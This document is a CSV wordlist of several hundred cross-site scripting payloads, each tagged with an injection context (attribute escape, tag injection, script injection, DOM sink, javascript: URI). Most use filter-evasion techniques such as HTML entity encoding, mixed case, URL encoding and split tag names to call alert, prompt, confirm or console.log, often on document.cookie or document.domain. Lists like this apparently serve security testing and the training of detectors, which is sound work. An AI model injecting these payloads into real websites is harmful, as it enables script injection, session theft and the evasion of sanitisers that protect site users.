payload,context
"%22 onfocus=console.log(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape
"""><svg onload=console.log(String.fromCharCode(88,83,83))>",tag_injection
<svg onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
' ontoggl&#101;=prompt('XSS') ',attribute_escape
<script>confirm`document.domain`</script>,script_injection
""" onfocus=alert(1) autofocus=""",attribute_escape
""" oNfoCus=prOmpT(1) """,attribute_escape
<script>/*/prompt(loc&#97;tion.h&#97;sh)</script>,script_injection
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection
"""><svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
"<svG oNclIck=alErt(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
' oNmoUseEntEr=ConFirM(dOcuMenT.cOokIe) ',attribute_escape
<svg onlo&#97;d=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
<svg onload=console.log('XSS')/>,tag_injection
<svg onfocus=prompt(document.cookie)>,tag_injection
<script>//console.log(1)</script>,script_injection
<scr	ipt>/*/console.log(document.cookie)</scr	ipt>,script_injection
<script>\u0061lert`1`</script>,script_injection
"""><svg onload=console.log('XSS')>",tag_injection
<script>prompt`docum&#101;nt.cooki&#101;`</script>,script_injection
' oNbeGin=coNfiRm('XSS') ',attribute_escape
%3Csvg onfocus=alert(document.cookie)/%3E,tag_injection
<svG oNmoUseEntEr=AleRt(DocUmeNt.DomAin)/>,tag_injection
%27 onclick=console.log(location.hash) %27,attribute_escape
""" on&#101;rror=&#97;l&#101;rt(1) """,attribute_escape
"eval(%22console.log(String.fromCharCode(88,83,83))%22)",dom_sink
<svg onerror=\u0061lert('XSS')>,tag_injection
' oNerRor=coNfiRm(LocAtiOn.HasH) ',attribute_escape
%27 ontoggle=console.log(1) %27,attribute_escape
%3Cimg onload=alert('XSS')%3E,tag_injection
' on&#101;rror=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
%3Csvg ontoggle=prompt(1)/%3E,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnfIrm(1)>"")",dom_sink
"""><svg onload=confirm(document.domain)>",tag_injection
%3Csvg onmouseover=confirm('XSS')%3E,tag_injection
' onerror=prompt(location.hash) ',attribute_escape
""" oNfoCus=prOmpT(lOcaTioN.hAsh) aUtoFocUs=""",attribute_escape
""" onlo&#97;d=confirm('XSS') """,attribute_escape
%27 onmouseover=alert(1) %27,attribute_escape
%3Csvg onbegin=alert('XSS')%3E,tag_injection
"""><Svg onMouSeoVer=coNsoLe.Log(1)>",tag_injection
<svg onbegin=\u0061lert(document.cookie)/>,tag_injection
<svg onerror=console.log(1)/>,tag_injection
"""><svg onb&#101;gin=prompt('XSS')>",tag_injection
"&#101;v&#97;l(""prompt(1)"")",dom_sink
<svg ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"' oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
"%22><img onload=alert(String.fromCharCode(88,83,83))>",tag_injection
"&#101;v&#97;l(""confirm('XSS')"")",dom_sink
JavAscRipT:aLerT(lOcaTioN.hAsh),js_uri
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
' onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
"""><svg onmouseover=alert(location.hash)>",tag_injection
%22><svg onmouseenter=prompt(location.hash)>,tag_injection
%3Cscript%3Ealert`location.hash`%3C/script%3E,script_injection
%22><svg ontoggle=confirm(location.hash)>,tag_injection
""" oNmoUseOveR=cOnfIrm(doCumEnt.coOkiE) """,attribute_escape
"%3Csvg onmouseenter=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"<svg onmouseenter=alert(String.fromCharCode(88,83,83))>",tag_injection
<svG oNmoUseOveR=cOnsOle.loG(dOcuMenT.dOmaIn)/>,tag_injection
""" oNtoGglE=aLerT(dOcuMenT.dOmaIn) """,attribute_escape
<svG oNmoUseOveR=aLerT(dOcuMenT.dOmaIn)/>,tag_injection
<svg onerror=confirm('XSS')>,tag_injection
""" onlo&#97;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"<svg onclick=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<script>prompt(document.cookie)</script>,script_injection
' oNbeGin=coNfiRm(DocUmeNt.CooKie) ',attribute_escape
<svg onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
"""><Svg onMouSeoVer=coNfiRm(DocUmeNt.DomAin)>",tag_injection
' onlo&#97;d=consol&#101;.log(1) ',attribute_escape
' onload=console.log(location.hash) ',attribute_escape
"""%3E%3Csvg onbegin=prompt('XSS')%3E",tag_injection
' oNmoUseOveR=cOnsOle.loG(1) ',attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnfIrm(doCumEnt.doMaiN)>"")",dom_sink
"%27 onerror=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
%3Csvg onerror=prompt(1)/%3E,tag_injection
"javascript:void(\u0061lert(String.fromCharCode(88,83,83)))",js_uri
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT('XSS')>"")",dom_sink
"""%3E%3Csvg ontoggle=confirm(location.hash)%3E",tag_injection
' oNbeGin=alErt(doCumEnt.coOkiE) ',attribute_escape
' onload=console.log(1) ',attribute_escape
"EvaL(""AleRt(LocAtiOn.HasH)"")",dom_sink
<script>\u0061lert(document.cookie)</script>,script_injection
' onmouseover=alert(document.cookie) ',attribute_escape
"EvaL(""ProMpt(loCatIon.haSh)"")",dom_sink
"%22 onmouseover=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnfIrm(loCatIon.haSh)>"")",dom_sink
' onmous&#101;&#101;nt&#101;r=prompt('XSS') ',attribute_escape
"<script>//&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
""" oNfoCus=alErt(doCumEnt.doMaiN) AutOfoCus=""",attribute_escape
<script>//&#97;l&#101;rt(docum&#101;nt.cooki&#101;)</script>,script_injection
"""><svg ontoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svG oNerRor=coNsoLe.Log('XSS')>,tag_injection
"<img onload=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svg onmouseenter=alert(document.domain)/>,tag_injection
"<scRipT>/*/pRomPt(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection
%3Csvg onmouseover=console.log(location.hash)%3E,tag_injection
""" oNmoUseEntEr=AleRt(1) """,attribute_escape
"<svG oNfoCus=coNfiRm(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
<scr	ipt>confirm`location.hash`</scr	ipt>,script_injection
%22><svg onerror=prompt(1)>,tag_injection
"' ontoggle=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
<svg onfocus=prompt(1)/>,tag_injection
""" oNmoUseEntEr=ConFirM(lOcaTioN.hAsh) """,attribute_escape
"""><img onload=prompt('XSS')>",tag_injection
<svG oNmoUseOveR=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
%22 onmouseenter=alert(%27XSS%27) %22,attribute_escape
%3Csvg ontoggle=prompt(1)%3E,tag_injection
' oNmoUseOveR=pRomPt(DocUmeNt.DomAin) ',attribute_escape
""" oNtoGglE=aLerT(lOcaTioN.hAsh) """,attribute_escape
%3Cscript%3E/*/console.log(1)%3C/script%3E,script_injection
j&#97;vascr	ipt:console.log(1),js_uri
"""><Svg onCliCk=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<script>/*/\u0061lert(document.domain)</script>,script_injection
""" onbegin=alert(1) """,attribute_escape
document.write(%22<img src=x onerror=console.log(1)>%22),dom_sink
' onb&#101;gin=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
"%22><svg ontoggle=confirm(String.fromCharCode(88,83,83))>",tag_injection
"eval(%22confirm(String.fromCharCode(88,83,83))%22)",dom_sink
""" onlo&#97;d=&#97;l&#101;rt(1) """,attribute_escape
eval(%22console.log(location.hash)%22),dom_sink
%27 onmouseover=prompt(%27XSS%27) %27,attribute_escape
%3Cscript%3Econsole.log`location.hash`%3C/script%3E,script_injection
""" onclick=\u0061lert(document.domain) """,attribute_escape
""" onb&#101;gin=confirm(1) """,attribute_escape
' oNmoUseOveR=pRomPt(1) ',attribute_escape
%22><svg onclick=console.log(%27XSS%27)>,tag_injection
%3Csvg onfocus=confirm(document.cookie)%3E,tag_injection
%22><svg onerror=console.log(document.domain)>,tag_injection
<svg onbegin=\u0061lert(1)/>,tag_injection
"""><svg onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"' onfocus=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
%3Csvg onmouseover=prompt(1)/%3E,tag_injection
"""><Svg onLoaD=aLerT(1)>",tag_injection
"<svG oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"setTimeout(""console.log(1)"",0)",dom_sink
' onload=confirm('XSS') ',attribute_escape
' onerror=confirm(document.cookie) ',attribute_escape
j&#97;vascr	ipt:confirm(document.domain),js_uri
%22><svg onclick=alert(%27XSS%27)>,tag_injection
""" onfocus=console.log(1) """,attribute_escape
' oNerRor=coNsoLe.Log(loCatIon.haSh) ',attribute_escape
j&#97;v&#97;script:void(confirm('XSS')),js_uri
%27 onmouseover=confirm(1) %27,attribute_escape
"""><svg onclick=confirm(document.cookie)>",tag_injection
%3Csvg ontoggle=console.log(document.cookie)/%3E,tag_injection
<svg onmouseover=alert(1)>,tag_injection
' onmouseenter=alert(document.domain) ',attribute_escape
%27 onbegin=console.log(1) %27,attribute_escape
<svg onfocus=\u0061lert(1)/>,tag_injection
javascr	ipt:void(console.log(1)),js_uri
"""><Svg onErrOr=ConFirM(lOcaTioN.hAsh)>",tag_injection
' onfocus=console.log(1) ',attribute_escape
<img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
""" onbegin=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
<svg onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
<svg onfocus=consol&#101;.log('XSS')>,tag_injection
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
"' onbegin=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
%22 onmouseenter=prompt(document.domain) %22,attribute_escape
<svg onmouseenter=console.log(%27XSS%27)/>,tag_injection
"""%3E%3Csvg onmouseover=prompt(1)%3E",tag_injection
<script>confirm`'XSS'`</script>,script_injection
' onfocus=\u0061lert(location.hash) ',attribute_escape
"""%3E%3Csvg onclick=prompt(1)%3E",tag_injection
"""><img onload=alert(1)>",tag_injection
"' onload=alert(String.fromCharCode(88,83,83)) '",attribute_escape
<svg onmous&#101;ov&#101;r=consol&#101;.log(1)>,tag_injection
"<svg onmouseover=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><svg onmouseover=console.log('XSS')>",tag_injection
j&#97;vascript:confirm(%27XSS%27),js_uri
"""><svg onclick=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
<svg onbegin=confirm(1)/>,tag_injection
<svG oNbeGin=coNsoLe.Log('XSS')/>,tag_injection
<svg onfocus=alert('XSS')/>,tag_injection
""" onfocus=console.log(document.domain) autofocus=""",attribute_escape
<svg onclick=console.log(%27XSS%27)/>,tag_injection
<svg onerror=console.log(document.cookie)/>,tag_injection
<script>&#97;l&#101;rt`loc&#97;tion.h&#97;sh`</script>,script_injection
' onmouseover=alert('XSS') ',attribute_escape
"%22><svg onmouseover=confirm(String.fromCharCode(88,83,83))>",tag_injection
<svg onload=prompt(document.domain)>,tag_injection
%3Csvg ontoggle=prompt(location.hash)%3E,tag_injection
<svg onmouseover=alert(document.domain)/>,tag_injection
%3Cscript%3E//alert(location.hash)%3C/script%3E,script_injection
"<svG oNtoGglE=aLerT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
"""%3E%3Csvg onbegin=alert(1)%3E",tag_injection
%22 ontoggle=console.log(document.domain) %22,attribute_escape
""" onbegin=\u0061lert('XSS') """,attribute_escape
<svg ontoggle=console.log(document.domain)/>,tag_injection
%22 onbegin=prompt(document.domain) %22,attribute_escape
""" onmouseenter=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
%3Cscript%3E/x/prompt(location.hash)%3C/script%3E,script_injection
"setTimeout(""alert(location.hash)"",0)",dom_sink
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1) ',attribute_escape
"""><svg onfocus=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
<svg onfocus=console.log(1)>,tag_injection
%22><svg onerror=prompt(location.hash)>,tag_injection
"""><svg onmouseenter=confirm(document.domain)>",tag_injection
%22 onmouseenter=alert(document.cookie) %22,attribute_escape
%22><svg onload=console.log(document.cookie)>,tag_injection
"""><svg ontoggle=console.log('XSS')>",tag_injection
<svg onerror=\u0061lert(location.hash)/>,tag_injection
<svg onmouseenter=prompt(document.cookie)>,tag_injection
"""%3E%3Csvg onfocus=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
%27 onbegin=confirm(document.cookie) %27,attribute_escape
<svG oNerRor=coNsoLe.Log(doCumEnt.coOkiE)>,tag_injection
' onclick=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
<svg on&#101;rror=&#97;l&#101;rt('XSS')>,tag_injection
%27 onload=confirm(location.hash) %27,attribute_escape
%27 onload=alert(location.hash) %27,attribute_escape
"<scr	ipt>alert`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection
""" ontoggl&#101;=prompt('XSS') """,attribute_escape
<svg onerror=alert(document.cookie)/>,tag_injection
"""><svg onmouseenter=console.log(String.fromCharCode(88,83,83))>",tag_injection
"""><Svg onErrOr=ConFirM(1)>",tag_injection
""" onclick=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"%22 onmouseenter=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
<scRipT>/*/pRomPt(LocAtiOn.HasH)</scRipT>,script_injection
"s&#101;tTim&#101;out(""consol&#101;.log(loc&#97;tion.h&#97;sh)"",0)",dom_sink
"<svG oNclIck=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
%3Csvg onmouseenter=console.log(document.domain)/%3E,tag_injection
%3Csvg onload=confirm(1)/%3E,tag_injection
"&#101;v&#97;l(""consol&#101;.log(loc&#97;tion.h&#97;sh)"")",dom_sink
%3Csvg onclick=alert('XSS')/%3E,tag_injection
"document.write(""%3Cimg src=x onerror=prompt(document.cookie)%3E"")",dom_sink
""" onerror=console.log('XSS') """,attribute_escape
""" onb&#101;gin=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
%22 onload=console.log(document.cookie) %22,attribute_escape
%3Csvg onbegin=prompt(document.domain)/%3E,tag_injection
%3Csvg onmouseover=alert(document.domain)%3E,tag_injection
<svg on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
<svG oNerRor=coNfiRm('XSS')>,tag_injection
%27 onmouseenter=confirm(1) %27,attribute_escape
<svg on&#101;rror=prompt(1)>,tag_injection
"<svg onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"""><svg onload=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svg onmouseenter=alert(%27XSS%27)/>,tag_injection
' ontoggle=confirm(document.cookie) ',attribute_escape
"""><svg ontoggle=\u0061lert(1)>",tag_injection
<script>console.log`document.domain`</script>,script_injection
"<svg ontoggle=console.log(String.fromCharCode(88,83,83))>",tag_injection
<script>/*/confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
' oNtoGglE=pRomPt('XSS') ',attribute_escape
%27 onload=prompt(1) %27,attribute_escape
""" onmouseenter=confirm(document.domain) """,attribute_escape
"%3Csvg onload=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection
<scRipT>aLerT`'XSS'`</scRipT>,script_injection
<svg onerror=console.log(document.domain)/>,tag_injection
%3Cscript%3E/x/alert('XSS')%3C/script%3E,script_injection
<svG oNtoGglE=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
""" on&#101;rror=consol&#101;.log('XSS') """,attribute_escape
"' oNclIck=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
<svG oNerRor=coNfiRm(DocUmeNt.CooKie)>,tag_injection
%3Cscript%3E//prompt(document.domain)%3C/script%3E,script_injection
javascr	ipt:void(alert(document.domain)),js_uri
<svG oNclIck=prOmpT(dOcuMenT.dOmaIn)/>,tag_injection
' onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
""" onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection
<svg onerror=alert(%27XSS%27)>,tag_injection
<svg ontoggle=alert(1)/>,tag_injection
"""%3E%3Csvg onerror=confirm(document.cookie)%3E",tag_injection
"eval(""confirm(location.hash)"")",dom_sink
"""%3E%3Csvg onmouseenter=confirm(document.cookie)%3E",tag_injection
' onerror=prompt(document.domain) ',attribute_escape
"""><Svg onMouSeeNteR=cOnsOle.loG(dOcuMenT.dOmaIn)>",tag_injection
<svg onb&#101;gin=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
"""><svg ontoggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onclick=prompt(location.hash)>,tag_injection
"<svg onclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%22 onload=alert(1) %22,attribute_escape
"<svg onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
<img onload=alert('XSS')>,tag_injection
""" oNmoUseEntEr=ProMpt(1) """,attribute_escape
"<scRipT>cOnfIrm`StRinG.fRomChaRCoDe(88,83,83)`</ScrIpt>",script_injection
"s&#101;tTim&#101;out(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink
' onmouseover=confirm(document.domain) ',attribute_escape
"' onmous&#101;&#101;nt&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<svg onerror=\u0061lert(1)/>,tag_injection
""" onmouseenter=prompt(document.domain) """,attribute_escape
<svg onload=confirm('XSS')/>,tag_injection
j&#97;vascript:prompt(1),js_uri
<svg onload=alert(1)/>,tag_injection
""" oNerRor=coNsoLe.Log(loCatIon.haSh) """,attribute_escape
"document.write(%22<img src=x onerror=prompt(String.fromCharCode(88,83,83))>%22)",dom_sink
"j&#97;vascr	ipt:prompt(String.fromCharCode(88,83,83))",js_uri
<svg ontoggle=console.log(location.hash)>,tag_injection
"""><svg onfocus=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
<scRipT>/*/aLerT(lOcaTioN.hAsh)</ScrIpt>,script_injection
<img onload=alert(location.hash)/>,tag_injection
J&#97;VasCriPt:ConSolE.lOg('XSS'),js_uri
"%22 onmouseenter=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
""" oNbeGin=coNsoLe.Log('XSS') """,attribute_escape
' onmouseenter=alert(location.hash) ',attribute_escape
"<svG oNloAd=AleRt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
""" onerror=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
"""><svg onerror=console.log(document.cookie)>",tag_injection
"""><Svg onCliCk=ConSolE.lOg('XSS')>",tag_injection
"""><img onload=\u0061lert('XSS')>",tag_injection
' oNmoUseEntEr=ConSolE.lOg('XSS') ',attribute_escape
""" onlo&#97;d=confirm(1) """,attribute_escape
""" ontoggle=confirm(location.hash) """,attribute_escape
"<script>console.log(String.fromCharCode(88,83,83))</script>",script_injection
<svg onbegin=\u0061lert(location.hash)/>,tag_injection
%27 onload=alert(%27XSS%27) %27,attribute_escape
' onerror=console.log(document.cookie) ',attribute_escape
<script>console.log(document.domain)</script>,script_injection
%22><svg onmouseenter=console.log(1)>,tag_injection
<imG oNloAd=AleRt('XSS')/>,tag_injection
""" oNmoUseEntEr=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
javascr	ipt:void(confirm(1)),js_uri
' onclick=&#97;l&#101;rt('XSS') ',attribute_escape
<svg onclick=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection
%3Csvg onmouseenter=console.log(document.domain)%3E,tag_injection
""" oNbeGin=coNfiRm('XSS') """,attribute_escape
"<svG oNmoUseOveR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
%3Csvg onbegin=alert(document.cookie)%3E,tag_injection
"<svg onbegin=console.log(String.fromCharCode(88,83,83))/>",tag_injection
%27 ontoggle=prompt(1) %27,attribute_escape
"<svg onerror=alert(String.fromCharCode(88,83,83))>",tag_injection
<svg onmouseenter=prompt(%27XSS%27)>,tag_injection
<svg onclick=consol&#101;.log(1)/>,tag_injection
%22><svg onmouseover=alert(location.hash)>,tag_injection
"<script>/*/prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
%22 onmouseenter=console.log(%27XSS%27) %22,attribute_escape
<svg ontoggl&#101;=prompt(1)/>,tag_injection
<svg on&#101;rror=&#97;l&#101;rt('XSS')/>,tag_injection
<img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<svG oNbeGin=prOmpT(lOcaTioN.hAsh)>,tag_injection
<svg onclick=confirm(%27XSS%27)/>,tag_injection
""" oNmoUseOveR=cOnfIrm(doCumEnt.doMaiN) """,attribute_escape
%22><svg onload=console.log(1)>,tag_injection
' onmous&#101;ov&#101;r=confirm(1) ',attribute_escape
<script>/x/alert(document.domain)</script>,script_injection
""" onlo&#97;d=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
""" oNbeGin=alErt('XSS') """,attribute_escape
""" oNloAd=AleRt(DocUmeNt.CooKie) """,attribute_escape
%3Csvg onclick=prompt(document.domain)/%3E,tag_injection
"eval(""prompt(String.fromCharCode(88,83,83))"")",dom_sink
%22 onbegin=alert(%27XSS%27) %22,attribute_escape
"""><svg onmouseover=alert('XSS')>",tag_injection
j&#97;v&#97;script:void(consol&#101;.log(loc&#97;tion.h&#97;sh)),js_uri
<svg ontoggle=console.log(location.hash)/>,tag_injection
<svg onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
<svg onload=prompt(%27XSS%27)/>,tag_injection
"%27 ontoggle=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
<script>/*/alert(1)</script>,script_injection
%3Csvg onmouseenter=confirm(document.domain)/%3E,tag_injection
j&#97;vascript:console.log(location.hash),js_uri
"""><svg onmous&#101;&#101;nt&#101;r=confirm(1)>",tag_injection
"""><svg ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
""" onclick=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
<script>&#97;l&#101;rt(docum&#101;nt.cooki&#101;)</script>,script_injection
%3Csvg onmouseenter=prompt('XSS')/%3E,tag_injection
""" onclick=&#97;l&#101;rt(1) """,attribute_escape
' onerror=\u0061lert(1) ',attribute_escape
"%22 onbegin=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"' oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
' onbegin=\u0061lert('XSS') ',attribute_escape
' onb&#101;gin=consol&#101;.log(1) ',attribute_escape
<svg onmous&#101;ov&#101;r=consol&#101;.log(1)/>,tag_injection
"<scRipT>//coNfiRm(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection
"""><svg onclick=confirm(location.hash)>",tag_injection
""" onload=confirm(document.domain) """,attribute_escape
"""><Svg onMouSeeNteR=cOnfIrm(doCumEnt.coOkiE)>",tag_injection
<svg onclick=console.log(location.hash)/>,tag_injection
"""><svg onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
%3Csvg onmouseover=console.log(document.domain)/%3E,tag_injection
""" oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
<script>/x/alert(1)</script>,script_injection
"""><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
' ontoggle=alert(location.hash) ',attribute_escape
"""><Svg onTogGle=coNsoLe.Log(doCumEnt.coOkiE)>",tag_injection
<svg onbegin=prompt(location.hash)>,tag_injection
' onmouseover=confirm('XSS') ',attribute_escape
' on&#101;rror=consol&#101;.log(1) ',attribute_escape
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink
<svg onfocus=console.log(1)/>,tag_injection
"' oNloAd=AleRt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
"%3Csvg onfocus=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
' onclick=console.log(1) ',attribute_escape
' onbegin=console.log(1) ',attribute_escape
<script>/*/&#97;l&#101;rt(docum&#101;nt.cooki&#101;)</script>,script_injection
""" oNmoUseOveR=pRomPt(DocUmeNt.CooKie) """,attribute_escape
eval(%22confirm(%27XSS%27)%22),dom_sink
"""><svg onmouseover=prompt(document.domain)>",tag_injection
<script>prompt`1`</script>,script_injection
%22><svg onerror=console.log(1)>,tag_injection
%22><img onload=prompt(1)>,tag_injection
%27 onmouseenter=console.log(document.cookie) %27,attribute_escape
"<svG oNtoGglE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
<script>console.log('XSS')</script>,script_injection
%22 onbegin=prompt(1) %22,attribute_escape
<svg onb&#101;gin=prompt(1)>,tag_injection
"%3Csvg onclick=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
<svg onclick=console.log(document.cookie)>,tag_injection
%3Cimg onload=alert(location.hash)%3E,tag_injection
<svG oNmoUseOveR=aLerT('XSS')/>,tag_injection
"<scr	ipt>/x/alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
%22><svg onbegin=alert(%27XSS%27)>,tag_injection
%3Csvg onclick=console.log(1)/%3E,tag_injection
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
<script>/x/console.log('XSS')</script>,script_injection
%3Csvg onbegin=alert(document.cookie)/%3E,tag_injection
' oNtoGglE=cOnsOle.loG(1) ',attribute_escape
<svg onmouseover=console.log('XSS')/>,tag_injection
""" onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
"""><Svg onBegIn=AleRt(LocAtiOn.HasH)>",tag_injection
' onlo&#97;d=&#97;l&#101;rt('XSS') ',attribute_escape
"""><svg onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
"<svg onmouseenter=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
' onerror=prompt('XSS') ',attribute_escape
""" onmouseenter=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"' oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"""><Svg onMouSeoVer=coNsoLe.Log(loCatIon.haSh)>",tag_injection
<scr	ipt>/*/prompt('XSS')</scr	ipt>,script_injection
""" onmous&#101;&#101;nt&#101;r=consol&#101;.log(1) """,attribute_escape
' onclick=&#97;l&#101;rt(1) ',attribute_escape
%3Csvg onload=prompt('XSS')/%3E,tag_injection
